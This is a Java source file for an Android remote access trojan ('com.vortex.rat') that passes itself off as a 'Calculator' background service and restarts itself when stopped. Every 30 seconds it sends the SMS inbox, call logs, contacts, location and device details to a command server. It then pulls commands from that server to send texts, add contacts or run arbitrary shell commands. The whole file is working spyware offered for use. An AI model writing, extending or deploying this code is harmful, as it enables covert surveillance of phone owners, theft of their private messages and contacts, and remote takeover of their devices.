package com.vortex.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.Location;
import android.location.LocationManager;
import android.provider.ContactsContract;
import android.database.Cursor;
import android.net.Uri;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {
    private static final String SERVER_URL = "https://your-server.onrender.com/api";
    private static final String DEVICE_ID = Settings.Secure.getString(
        getContentResolver(), Settings.Secure.ANDROID_ID
    );
    
    private Timer timer;
    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        
        // Start foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startMyOwnForeground();
        }
        
        // Schedule task
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                sendData();
                checkCommands();
            }
        }, 0, 30000); // Every 30 seconds
    }

    private void startMyOwnForeground() {
        String channelId = "vortex_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId,
                "Vortex Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }
        
        Notification notification = new Notification.Builder(this, channelId)
            .setContentTitle("Calculator")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build();
        
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        // Restart service
        Intent restartIntent = new Intent(this, MainService.class);
        startService(restartIntent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ==================== DATA COLLECTION ====================

    private void sendData() {
        try {
            JSONObject data = new JSONObject();
            
            // Device info
            data.put("device_id", DEVICE_ID);
            data.put("model", Build.MODEL);
            data.put("manufacturer", Build.MANUFACTURER);
            data.put("android_version", Build.VERSION.RELEASE);
            data.put("sdk_version", Build.VERSION.SDK_INT);
            data.put("root_status", isRooted());
            
            // Get SMS
            data.put("sms", getSMS());
            
            // Get Calls
            data.put("calls", getCalls());
            
            // Get Contacts
            data.put("contacts", getContacts());
            
            // Get Location
            data.put("location", getLocation());
            
            // Send to server
            sendToServer("/device/" + DEVICE_ID + "/update", data.toString());
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== SMS FUNCTIONS ====================

    private JSONArray getSMS() {
        JSONArray smsArray = new JSONArray();
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"address", "body", "date", "type"};
            Cursor cursor = getContentResolver().query(uri, projection, null, null, "date DESC");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("number", cursor.getString(0));
                    sms.put("body", cursor.getString(1));
                    sms.put("timestamp", cursor.getLong(2));
                    sms.put("type", cursor.getString(3));
                    smsArray.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return smsArray;
    }

    public void sendSMS(String number, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== CALL LOG FUNCTIONS ====================

    private JSONArray getCalls() {
        JSONArray callsArray = new JSONArray();
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE
            };
            Cursor cursor = getContentResolver().query(uri, projection, null, null, "date DESC");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(0));
                    call.put("name", cursor.getString(1));
                    call.put("duration", cursor.getInt(2));
                    call.put("type", getCallType(cursor.getInt(3)));
                    call.put("timestamp", cursor.getLong(4));
                    callsArray.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return callsArray;
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            default: return "unknown";
        }
    }

    // ==================== CONTACT FUNCTIONS ====================

    private JSONArray getContacts() {
        JSONArray contactsArray = new JSONArray();
        try {
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.EMAIL
            };
            Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(0));
                    contact.put("number", cursor.getString(1));
                    contact.put("email", cursor.getString(2) != null ? cursor.getString(2) : "");
                    contactsArray.put(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return contactsArray;
    }

    public void addContact(String name, String number) {
        try {
            ContentValues values = new ContentValues();
            values.put(ContactsContract.RawContacts.ACCOUNT_TYPE, null);
            values.put(ContactsContract.RawContacts.ACCOUNT_NAME, null);
            Uri rawContactUri = getContentResolver().insert(
                ContactsContract.RawContacts.CONTENT_URI, values
            );
            long rawContactId = Long.parseLong(rawContactUri.getLastPathSegment());
            
            // Name
            values = new ContentValues();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name);
            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
            
            // Number
            values = new ContentValues();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, number);
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== LOCATION FUNCTIONS ====================

    private JSONObject getLocation() {
        JSONObject locationObj = new JSONObject();
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                locationObj.put("lat", location.getLatitude());
                locationObj.put("lng", location.getLongitude());
                locationObj.put("accuracy", location.getAccuracy());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return locationObj;
    }

    // ==================== COMMAND FUNCTIONS ====================

    private void checkCommands() {
        try {
            String response = getFromServer("/device/" + DEVICE_ID + "/commands");
            if (response != null) {
                JSONArray commands = new JSONArray(response);
                for (int i = 0; i < commands.length(); i++) {
                    JSONObject cmd = commands.getJSONObject(i);
                    int id = cmd.getInt("id");
                    String command = cmd.getString("command");
                    String result = executeCommand(command);
                    sendCommandResult(id, result);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String executeCommand(String command) {
        try {
            JSONObject cmd = new JSONObject(command);
            String type = cmd.getString("type");
            
            switch (type) {
                case "sms":
                    sendSMS(cmd.getString("number"), cmd.getString("message"));
                    return "SMS sent successfully";
                case "add_contact":
                    addContact(cmd.getString("name"), cmd.getString("number"));
                    return "Contact added successfully";
                case "shell":
                    return executeShell(cmd.getString("command"));
                default:
                    return "Unknown command: " + type;
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String executeShell(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (Exception e) {
            return "Shell error: " + e.getMessage();
        }
    }

    // ==================== NETWORK FUNCTIONS ====================

    private void sendToServer(String endpoint, String data) {
        try {
            URL url = new URL(SERVER_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode(); // Just to trigger the request
            conn.disconnect();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getFromServer(String endpoint) {
        try {
            URL url = new URL(SERVER_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream())
            );
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            conn.disconnect();
            
            return response.toString();
            
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private void sendCommandResult(int commandId, String result) {
        try {
            JSONObject data = new JSONObject();
            data.put("result", result);
            sendToServer("/device/" + DEVICE_ID + "/command/" + commandId + "/result", data.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== UTILITY FUNCTIONS ====================

    private boolean isRooted() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            process.destroy();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}